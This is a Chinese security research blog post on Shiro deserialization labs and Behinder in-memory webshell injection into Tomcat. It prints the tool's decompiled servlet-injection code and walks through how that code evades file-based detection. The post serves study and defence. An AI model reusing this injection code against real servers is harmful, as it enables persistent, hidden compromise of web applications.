---
layout: about
category: about
Researchname:  基于内存的Shiro框架Webshell攻击研究
toc: true
author: Bin4xin
wrench: 2026-07-24
permalink: /about/Research-on-Webshell-Attack-of-Shiro-Framework-Based-on-Memory/
desc: 「其他研究」
---

{% include shiro-common/shiro-common.md  %}

# 基于内存的Shiro框架Webshell攻击研究

- ✅ Shiro框架部署
    * IDEA tomcat调试部署
    * docker compose
- ✅ Shiro框架攻击
    * 手动poc
    * 工具poc
- ✅ 基于tomcat的通用回显
    * tomcat冰蝎内存马
        * 利用原理
        * 攻击测试
- ✅ 给👴连！

---

## 零：Shiro框架部署

现如今部署一个靶场的方法有很多，取决于个人喜好和需求；我结合个人能力做出了一些总结：

{: .table}
| 特点\部署办法 | docker-compose | IDEA tomcat调试部署 | Docker+IDEA |
| :--- | :--- | :--- | :--- |
| 快捷程度 | 几条命令快捷部署 | 需开放调试端口+tomcat war包(如无则需源码构建) | 你懂的 |
| 能否调试 | ❎ | ✅ | ✅ |
| 自定义靶场（如页面） | ❎ | ✅ | ✅ |

{% include common-index/index-preset.html level="info" msg="提示：本文侧重描述 IDEA tomcat 调试部署方式，适合需要断点调试和源码分析的场景。如仅需快速搭建靶场环境，推荐使用 docker-compose 方式。" %}

#### # 0x01：IDEA tomcat调试部署

本篇文章会侧重描述如何进行针对IDEA的tomcat调试部署；

- 克隆源码
  * 以shiro-721为例：

{% details 👉 Shiro 源码克隆与构建命令 %}

```bash
git clone https://github.com/apache/shiro.git
cd shiro
git checkout shiro-root-1.4.1
mvn install
cd samples/web
mvn install
```

{% enddetails %}

  * 找到`{path-to-shiro}/samples/web/target`目录下的war包复制到tomcat webapps目录下：

{% details 👉 war包复制命令 %}

```bash
$ tree
target
··
│   ├── index.jsp
│   ├── login.jsp
│   ├── logout.jsp
│   └── style.css
├── samples-web-1.4.1.war

$ cp samples/web/target/samples-web-1.4.1.war {path-to-tomcat}/webapps/
```

{% enddetails %}

- 开放tomcat调试端口：
    * 找到`bin/catalina.sh`文件中的`JAVA_OPTS`（会有多个），修改如下：

{% details 👉 catalina.sh 调试配置 %}

```
  JAVA_OPTS="$JAVA_OPTS $JSSE_OPTS"
  
  # Register custom URL handlers
  # Do this here so custom URL handles (specifically 'war:...') can be used in the security policy
  JAVA_OPTS="$JAVA_OPTS -Djava.protocol.handler.pkgs=org.apache.catalina.webresources"
  CATALINA_OPTS="-Xdebug -Xrunjdwp:transport=dt_socket,address=5555,suspend=n,server=y"
  #上面的CATALINA_OPTS为新增；address为调试端口，可自行更改。
```

{% enddetails %}

    * `bin/startup.sh`启动，看到以下日志打印则开放调试成功：

{% details 👉 调试启动成功日志 %}

```
  $ tail -f logs/catalina.out
  Listening for transport dt_socket at address: 5555
  10-Mar-2021 09:51:16.763 信息 [main] org.apache.catalina.startup.VersionLoggerListener.log Server.服务器版本: Apache Tomcat/8.5.57
  ···
  10-Mar-2021 09:51:16.769 信息 [main] org.apache.catalina.startup.VersionLoggerListener.log 命令行参数：-Xdebug
  10-Mar-2021 09:51:16.769 信息 [main] org.apache.catalina.startup.VersionLoggerListener.log 命令行参数：-Xrunjdwp:transport=dt_socket,address=5555,suspend=n,server=y
```

{% enddetails %}

- IDEA+tomcat调试：
    * IDEA配置（添加server时为`Tomcat Server`->`Remote`）：

    ![lzFJ2uNZPagBfn6.png]({{site.PicturesLinks_Domain}}/images/2022/02/20/lzFJ2uNZPagBfn6.png)

      * 如下图，加上`home.jsp`断点后进行http请求，可以看到IDEA中返回的frames详情；

    ![6WGlumFBdDwstVY.png]({{site.PicturesLinks_Domain}}/images/2022/02/20/6WGlumFBdDwstVY.png)

{% include common-index/index-preset.html level="info" msg="提示：以上仅为调试前的准备工作，多练习几次即可熟练掌握。调试过程中的技巧和能力需要在一次次实践中沉淀，本文仅作抛砖引玉。" %}

这样基本上一个基本的IDEA+tomcat的调试配置过程基本就完成了，当然，这只是调试前的准备工作，大家多练习几次，基本上就能够熟练掌握；而最重要的以及最难的其实是调试阶段，调试过程中的一些技巧和能力是在一次次的实践中沉淀下来的，在这里仅仅当作抛砖引玉，不做赘述。

#### # 0x02：docker compose部署

- 准备工作
    * 根据不同操作系统下载安装docker；
    * 安装`python->pip->docker-compose`，教程自行搜索:)

- 下载靶场
    * vulhub based on docker：

{% details 👉 docker-compose 部署命令 %}

```bash
$ git clone https://github.com/vulhub/vulhub.git
$ cd vulhub/shiro/CVE-2016-4437/
$ docker-compose up -d
```

{% enddetails %}

{% include common-index/index-preset.html level="warn" msg="注意：docker-compose 部署方式仅适用于本地靶场搭建和安全研究，请勿在未授权的目标环境中使用。" %}

等待启动即可。

---

## 一：Shiro框架攻击

poc代码生成攻击cookie可以参考之前的文章：

#### 1x01：手动poc

[分享：Different Shiro Framework deserialization analysis ideas#how to poc](/about/ShiroDeser/#2x03how-to-poc){:target="_blank"}

#### 1x02：工具poc

[分享：Different Shiro Framework deserialization analysis ideas#验证](/about/ShiroDeser/#%E4%BA%8C%E9%AA%8C%E8%AF%81){:target="_blank"}

---

## 二：基于tomcat的通用回显之冰蝎内存马

> 这一小节由于个人水平有限，不能像各位师傅一样从tomcat servlet等层面一探究竟，我尽量使用简洁的语言写出我的理解。

#### # 2x01：攻击测试

工具直接选择"冰蝎2_Tomcat"，执行注入；

- http发包请求如下：

![tUJATRsNyZQFWX4.png]({{site.PicturesLinks_Domain}}/images/2022/02/20/tUJATRsNyZQFWX4.png)

- 我们可以看到HTTP请求为POST请求`p`&`path`&`dy`数据；同时header中加入了`rememberMe Cookie`；

> **分析：** Cookie是作为反序列化的入口，`dy`参数应该是写入内存的命令。同时最后返回`dynamic inject success`。

- 注入成功效果：

![jKPIn8YHdTsW9LS.png]({{site.PicturesLinks_Domain}}/images/2022/02/20/jKPIn8YHdTsW9LS.png)

{% include common-index/index-preset.html level="warn" msg="注意：冰蝎内存马注入后驻留在目标服务器内存中，不落盘文件，传统的文件查杀工具无法检测。建议在安全研究中谨慎操作，测试完毕后及时重启服务清除内存马。" %}

#### # 2x02：利用原理

我们把利用工具的jar包扔进反编译软件定位到`BehOldDemoServlert.class`，我们来看看代码是怎么工作的：

{% details 👉 BehOldDemoServlert.class 反编译源码 %}

```java
public void dynamicAddServlet(ServletContext servletContext) throws Exception {
    Method method;
    String wrapperName = this.path;
    ApplicationContextFacade applicationContextFacade = (ApplicationContextFacade)servletContext;
    Field applicationContextField = applicationContextFacade.getClass().getDeclaredField("context");
    applicationContextField.setAccessible(true);
    ApplicationContext applicationContext = (ApplicationContext)applicationContextField.get(applicationContextFacade);
    Field standardContextField = applicationContext.getClass().getDeclaredField("context");
    standardContextField.setAccessible(true);
    StandardContext standardContext = (StandardContext)standardContextField.get(applicationContext);
    Object newWrapper = invoke(standardContext, "createWrapper", (Object[])null);
    invoke(newWrapper, "setName", new Object[] { wrapperName });
    setFieldValue(newWrapper, "instance", this);
    Class<?> containerClass = Class.forName("org.apache.catalina.Container", false, standardContext.getClass().getClassLoader());
    Object oldWrapper = invoke(standardContext, "findChild", new Object[] { wrapperName });
    if (oldWrapper != null)
      standardContext.getClass().getDeclaredMethod("removeChild", new Class[] { containerClass }); 
    standardContext.getClass().getDeclaredMethod("addChild", new Class[] { containerClass }).invoke(standardContext, new Object[] { newWrapper });
    try {
      method = standardContext.getClass().getMethod("addServletMappingDecoded", new Class[] { String.class, String.class });
    } catch (Exception var9) {
      method = standardContext.getClass().getMethod("addServletMapping", new Class[] { String.class, String.class });
    } 
    method.invoke(standardContext, new Object[] { this.path, wrapperName });
    init((ServletConfig)getFieldValue(newWrapper, "facade"));
}
```

{% enddetails %}

### 代码分析

上述 `dynamicAddServlet` 方法是冰蝎内存马的核心注入逻辑，整体流程可拆解为以下 **6 个关键步骤**：

#### 步骤 1：获取 ServletContext 内部引用链

```java
ApplicationContextFacade applicationContextFacade = (ApplicationContextFacade)servletContext;
Field applicationContextField = applicationContextFacade.getClass().getDeclaredField("context");
applicationContextField.setAccessible(true);
ApplicationContext applicationContext = (ApplicationContext)applicationContextField.get(applicationContextFacade);
Field standardContextField = applicationContext.getClass().getDeclaredField("context");
standardContextField.setAccessible(true);
StandardContext standardContext = (StandardContext)standardContextField.get(applicationContext);
```

通过 **双重反射** 穿透 Tomcat 的 `ApplicationContextFacade → ApplicationContext → StandardContext` 引用链，获取 Tomcat 内部的 `StandardContext` 对象。该对象是 Web 应用的核心容器，管理着所有的 Servlet、Filter、Listener 等组件。由于这些内部字段均为 `private`，需要通过 `setAccessible(true)` 绕过访问控制。

#### 步骤 2：创建 Wrapper 并设置恶意 Servlet 实例

```java
Object newWrapper = invoke(standardContext, "createWrapper", (Object[])null);
invoke(newWrapper, "setName", new Object[] { wrapperName });
setFieldValue(newWrapper, "instance", this);
```

调用 `StandardContext.createWrapper()` 创建一个新的 `Wrapper` 对象（Tomcat 中 `Wrapper` 是 Servlet 的容器抽象），并将 `this`（即恶意 Servlet 实例）设置为该 Wrapper 的 `instance` 字段。`wrapperName` 来自攻击者指定的 `path` 参数，决定了内存马的访问路径。

#### 步骤 3：移除旧 Wrapper（防重复注册）

```java
Object oldWrapper = invoke(standardContext, "findChild", new Object[] { wrapperName });
if (oldWrapper != null)
  standardContext.getClass().getDeclaredMethod("removeChild", new Class[] { containerClass }); 
```

通过 `findChild` 检查是否已存在同名 Wrapper。如果存在（即内存马已注入过），先调用 `removeChild` 移除旧的，避免注册冲突。这保证了重复注入的幂等性。

#### 步骤 4：将 Wrapper 注册到 StandardContext

```java
standardContext.getClass().getDeclaredMethod("addChild", new Class[] { containerClass })
  .invoke(standardContext, new Object[] { newWrapper });
```

调用 `addChild` 将新的 Wrapper 添加到 `StandardContext` 的子容器列表中。这是将恶意 Servlet 注册到 Tomcat 运行时上下文的核心步骤。

#### 步骤 5：映射 URL 路径

```java
try {
  method = standardContext.getClass().getMethod("addServletMappingDecoded", new Class[] { String.class, String.class });
} catch (Exception var9) {
  method = standardContext.getClass().getMethod("addServletMapping", new Class[] { String.class, String.class });
}
method.invoke(standardContext, new Object[] { this.path, wrapperName });
```

调用 `addServletMappingDecoded`（或降级为 `addServletMapping`）将攻击者指定的 URL 路径映射到 Wrapper。此后，访问该路径即可触发恶意 Servlet 的 `service()` 方法。`try-catch` 是为了兼容不同 Tomcat 版本的 API 差异。

#### 步骤 6：初始化 Servlet

```java
init((ServletConfig)getFieldValue(newWrapper, "facade"));
```

从 Wrapper 中获取 `ServletConfig`（facade），调用 `init()` 方法完成 Servlet 的初始化。至此，恶意 Servlet 完全融入 Tomcat 的生命周期管理，与正常注册的 Servlet 无异。

> **关键特征：** 整个过程完全在内存中完成，不涉及任何文件的创建或修改。恶意 Servlet 通过 `StandardContext` 的内部 API 注册，不会出现在 `web.xml` 部署描述符中，传统的文件扫描和配置审计均无法检测。重启 Tomcat 服务后内存马自动清除。

{% include common-index/index-preset.html level="info" msg="提示：上述代码展示了冰蝎内存马通过反射机制动态注册 Servlet 到 Tomcat 容器的核心流程。通过 StandardContext 的 createWrapper → addChild → addServletMapping 步骤，将恶意 Servlet 注入到运行时上下文中。" %}
